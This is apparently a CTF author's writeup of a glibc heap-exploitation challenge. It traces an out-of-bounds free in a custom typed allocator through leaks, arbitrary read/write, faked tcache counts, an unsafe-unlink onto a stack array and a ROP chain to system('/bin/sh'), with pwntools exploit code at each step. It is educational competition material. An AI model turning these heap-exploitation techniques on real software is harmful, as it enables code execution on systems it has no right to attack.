---
id: 6
title: "Sieberrsec CTF Finals 2026"
subtitle: "Writeup for pwn/yet another notepad (finals)"
date: "2026.07.05"
tags: "writeups"
---

Around two weeks ago, one pwn challenge that I wrote was pushed to the Sieberrsec CTF Finals this year. However, it got no solves (and no one probably tried it. including the vetters. :( but we chud on.)

# pwn/yet another notepad

What this challenge basically implements is a heap allocator that hijacks the tcache freelist to system to differentiate user allocations and privileged allocations. 

```c 
static void *alloc_typed(size_t size, uint8_t type);
void free_typed(void *p, uint8_t type);
```

The signature of the chunks is written to the exact offset of the chunk from a mirrored `mmap()` base.

```c 
static void ensure_tag_region(void) {
	if (tag_base) return;
	tag_base = mmap(NULL, 0x21000, PROT_READ | PROT_WRITE,
	                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (tag_base == MAP_FAILED) {
		perror("mmap");
		_exit(1);
	}
	tag_size = 0x21000;
}

// <snip>

static inline void sign_chunk(void *p, uint8_t type) {
	uint64_t offset = (uint8_t *)p - heap_base;
	*chunk_tag_ptr(p) = encode(offset, type);
}
```

`alloc_typed()` does services requests by manually walking the tcachebin freelist for the respective size, and then manually unlinking the chunk with the appropriate type to service the allocation request. If it does not find it in the bin, it allocates from other bins, and then signs them based on a precedence system. `free_typed()`, however, signs the chunk with the respective type and frees it with GLIBC `free()`.

```c 
static void *alloc_typed(size_t size, uint8_t type) {
	size_t idx = size_to_tcache_idx(size);
	tcache_perthread_struct *tcache = get_tcache();
	void *p;
	int needs_sign = 1;
	if (idx < TCACHE_MAX_BINS) {
		tcache_entry *prev = NULL;
		tcache_entry *cur = tcache->entries[idx];

		while (cur != NULL) {
			tcache_entry *next = decode_next(cur, cur->next);

			if (chunk_has_type(cur, type)) {
                // <snip>
			}

			prev = cur;
			cur = next;
		}

        // <snip>
	}

	p = malloc(size);

out:
	if (needs_sign) {
		sign_chunk(p, type);
	}
	memset(p, 0, size);
	return p;
}

void free_typed(void *p, uint8_t type) {
	if (((uintptr_t)p & 1) == 1)
		return;
	if (!p) return;
	sign_chunk(p, type);
	free(p);
}
```

The `TYPE_META` chunks are used for `MetaArr` objects which serve as dynamic arrays holding allocations for `TYPE_USER` chunk allocations. 

Given the constraints, this is a pretty sandboxed heap, in that even if you have a primitive that gives you something like tcache poisoning, it is impossible to get a reliable arbitrary read/write because the allocation will attempt to write a signature outside the bounds of the mmap base, given the offset of the destination (usually libc) from the heap.

Another way of RCE will have to be found in this case.

## Vulnerability

The vulnerability is an OOB in the `handle_alloc()` and `handle_free()` functions:

```c 
void handle_alloc(MetaArr **chunks) {
	int idx = get_int("idx: ");
	int arr_idx = get_int("arr idx: ");

	if (!chunks[idx])
		chunks[idx] = (MetaArr*)alloc_meta(sizeof(MetaArr));
	
	if (idx < 0 || idx >= 0x10) {
		printf("idx out of bounds");
		return;
	}

	chunks[idx]->count++;

	if (arr_idx < 0 || arr_idx >= 0x10) {
		printf("arr idx out of bounds");
		return;
	}
    // <snip> 
}

void handle_free(MetaArr **chunks) {
	int idx = get_int("idx: ");

	if (idx < 0 || idx >= 0x10) {
		printf("idx out of bounds");
		return;
	}

	if (!chunks[idx]) {
		printf("index is empty\n");
		return;
	}

	for (int i = 0; i < chunks[idx]->count; i++)
	{
		free_typed(chunks[idx]->user_chunks[i], TYPE_USER);
	}

	free_typed(chunks[idx], TYPE_META);
	chunks[idx] = NULL;
}
```

Do you see the problem? Even if the chunk index is invalid in `handle_alloc`, the `count` field of the `MetaArr` is still incremented.

Afterwards, the `count` is used by the `handle_free` function to free all chunks in the `MetaArr` object, iterating out of bounds of the actual MetaArr. This gives us an OOB free primitive.

## What can we do with an OOB free?

The idea is simple. Note that the `handle_free` function does not null out the entries because it will remove references to the `MetaArr` object instead. It also has a (rather convenient) check for if the pointer has an LSB of 1 (i wonder why), and then skips freeing it if it does. 

We can allocate two `MetaArr` objects next to each other:

```
                   ----------------------------------------------
                   |  Meta Arr            | Count=large number   |
                   | ...                                         |
                   ----------------------------------------------
                   ----------------------------------------------
                   |  Victim MetaArr      | Count=ok number      |
                   | ...                                         |
                   ----------------------------------------------
```

And freeing the first MetaArr will free pointers in the victim MetaArr, giving us a UAF:

```python 
malloc(0, 18, b'', send=False) # create empty MetaArr so the two MetaArrs can kiss

for i in range(9):
    malloc(1, i, b'a')         # second MetaArr

for i in range(26):
    malloc(0, 18, b'', send=False) # increment count arbitrarily

free(0)

heap = u64(read(1, 0).ljust(8, b'\0')) << 12
log.info("heap, %#x", heap)

libc.address = u64(read(1, 7).ljust(8, b'\0')) - libc.sym.main_arena - 352
log.info("libc.address, %#x", libc.address)
```

## Getting an arb something now

so we have our UAF. But now what?

Remember that we can't do tcache poisoning directly because arballoc will attempt to write a signature out of bounds of the mmap base. 

We can't do an attack like faking chunk size headers by writing onto them directly because those offsets haven't been signed yet, and `handle_write` only allows us to write onto signed offsets:

```c 
void handle_write(MetaArr **chunks) {
	int idx = get_int("idx: ");

	if (idx < 0 || idx >= 0x10) {
		printf("idx out of bounds");
		return;
	}

	if (!chunks[idx]) {
		printf("index is empty\n");
		return;
	}

	int arr_idx = get_int("arr_idx: ");

	if (arr_idx < 0 || arr_idx >= 0x10) {
		printf("arr idx out of bounds");
		return;
	}

	if (!chunks[idx]->user_chunks[arr_idx]) {
		printf("array index is empty\n");
		return;
	}

	if (!chunk_has_type((tcache_entry *)chunks[idx]->user_chunks[arr_idx], TYPE_USER)) {
		printf("chunk is not user\n");
		return;
	}

	printf("content: ");
	read(0, chunks[idx]->user_chunks[arr_idx], USERBUF_SZ);
}
```

However a useful thing we could possibly do is to get **arb free** .

Recall that freeing something signs it with the corresponding type:

```c 
void free_typed(void *p, uint8_t type) {
	if (((uintptr_t)p & 1) == 1)
		return;
	if (!p) return;
	sign_chunk(p, type);
	free(p);
}
```

which means that what we could possibly do is to:
1. Obtain a reference to a `TYPE_META` chunk in one of our MetaArrs
2. free that reference to sign it with the `TYPE_USER` signature
3. write into the MetaArr to get a more powerful arbfree primitive

How do we do this?

### The Heap

Recall that GLIBC heap is simply just not the tcache. When we free a chunk, there is a checklist `free()` goes through to categorise the chunk into one of the bins:
1. Is it tcache size?
2. if tcache size, is the tcache full?
3. if tcache full, is it fastbin size?
4. if not fastbin size, is it next to the top chunk?
5. if next to top chunk, consolidate into top chunk.
6. if not next to top chunk, unsorted/small/largebins.

if our tcache is hard to exploit because of the surrounding allocator, we can simply base our exploit around the other bins. 

To get a reference to one of the MetaArr chunks, we can exploit the consolidation of unsorted/large/smallbin chunks into the top:

1. fill the tcache with 7 MetaArr-sized chunks with the OOB free vuln
2. the 8th chunk consolidates into the top chunk
3. empty the tcache
4. next MetaArr `TYPE_META` allocation pulls from the top chunk
5. because we have a dangling reference to the 8th chunk and it got reclaimed by the MetaArr allocation, we have a reference to the MetaArr chunk!
6. free it to sign it as a user chunk.

```python 
malloc(0xf, 18, b'', send=False) # reclaim from the top chunk

for i in range(11):
    malloc(2+i, 18, b'', send=False)

for i in range(4, 13):
    free(i)

for i in range(7):
    malloc(1, i, b'a')

malloc(1, 8, b'a', send=False)

free(3)
free(1)

# 2 is the user-signed metadata struct now
```

## Friendship ended with tcache, now unsorted/small/largebin is my best friend

We have write over a MetaArr chunk, which means we have an arbfree primitive that lets us sign arbitrary offsets of the heap. 

We want to move our heap outside of the tcache's influence so it doesn't screw up our heap exploit, and we do this with a few steps:

1. we want enough usable MetaArr objects to control in the heap, so we're going to "spray" them, and then free all of them with our controlled MetaArr
2. we want our allocations to not be serviced by the tcache, so we're going to write to the tcache perthread struct and fool tcache into thinking all its bins are full.
3. now nothing is under the tcache's jurisdiction (like a hostile takeover)

### Spraying MetaArr

```python 
for i in range(7):
    malloc(1, i, b'a')

malloc(1, 7, flat([    # reclaims MetaArr 2
    0x8, p64(0)*7
]))

write(1, 7, flat({
    0: [
        0x10, heap+0x10,
        heap+0x2a0, heap+0x330,
        heap+0xc50, heap+0xce0,
        heap+0xd70, heap+0xe00,
        heap+0xe90, heap+0xf20, 
    ]
}))                    # references to all the sprayed MetaArr chunks, and the tcache perthread struct
                       # by freeing the tcache perthread struct, we sign it as a user chunk and are able to write to it 

malloc(4, 18, b'a', send=False)
malloc(5, 18, b'a', send=False)
malloc(6, 18, b'a', send=False)
malloc(7, 18, b'a', send=False)
malloc(8, 18, b'a', send=False)
malloc(9, 18, b'a', send=False)
malloc(10, 18, b'a', send=False)   # spraying

free(2)                # all your bases are belong to us
```

### Caged-read/write

as long as we are able to free something, we are able to write to it.

so if we've freed everything, we can write to everything!

we reclaim one of the MetaArr chunks and then we write arbitrary addresses to the entry to get an arbread/write

```python
malloc(1, 8, flat([0x10])) 
malloc(1, 8, flat([0x10])) # reclaims one of the MetaArr chunks as a writable

victim = 8
chunk_vic = 9

def arbread(addr):
    write(1, victim, p64(0x10)+p64(addr))
    return u64(read(chunk_vic, 0).ljust(8, b'\0'))

def arbwrite(addr, content):
    write(1, victim, p64(0x10)+p64(addr))
    write(chunk_vic, 0, content)
```

Then we fake the tcachebin counts so the bins are "full":

```python
arbwrite(heap+0x10, flat([
    0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0
], word_size=16).ljust(0x60, b'\xff'))
```

now nothing comes from the tcache! we have full "control" over the heap

## RCE 

There is no check for type on read. We first get the stack address via environ and leak the base address of the chunks array:

```python
environ = arbread(libc.sym.environ)
log.info("environ, %#x", environ)
chunks = environ - 0x1e8
log.info('chunks, %#x', chunks)
```

We can't tcache poison or do any form of arballoc, but we can do unlink write attacks like unsafe-unlink or largebin attack. Since we cannot allocate arbitrary sizes, we will have to use the unsafe-unlink attack.

Notice that the MetaArr array is on the stack:

```c 
int handler() {
	int choice = 0;
	MetaArr *chunks[0x10] = {0};

    // <snip>
}

int main() {
	int ret = handler();
	return ret;
}
```

If we can use the unsafe-unlink to overwrite an entry in the chunks array with a stack address, we could get the program to think the chunk entry with the stack address  we could then write a heap allocation onto an offset of the stack address and 

We opportunistically place a MetaArr chunk at the beginning of our solve at a close enough index of the array:

```python
libc.address = u64(read(1, 7).ljust(8, b'\0')) - libc.sym.main_arena - 352
log.info("libc.address, %#x", libc.address)

malloc(0xf, 18, b'', send=False)
```

Now, later into the solve, we can perform the unsafe unlink on the same chunk:

```python
arbwrite(heap+0x2a0, flat(
    0, 0x111,
    chunks+0x78-0x18, chunks+0x78-0x10
))

arbwrite(heap+0x330, flat({
    0xb0-0x30: [0x110, 0x110]
}, filler=b'\0'))

def arbfree(addr):
    write(1, victim, p64(0x10)+p64(addr))
    free(chunk_vic)

arbfree(heap+0x3c0)
```

This overwrites the saved RBP. Writing a rop chain in that allocation and exiting the program then gives us the stack pivot and ROP to system, giving us a shell:

```python
rop = ROP(libc)
rop.raw(0)
rop.raw(rop.ret[0])
rop.system(next(libc.search(b'/bin/sh\0')))

malloc(0xf, 5, rop.chain())

option(5)

p.interactive()
```
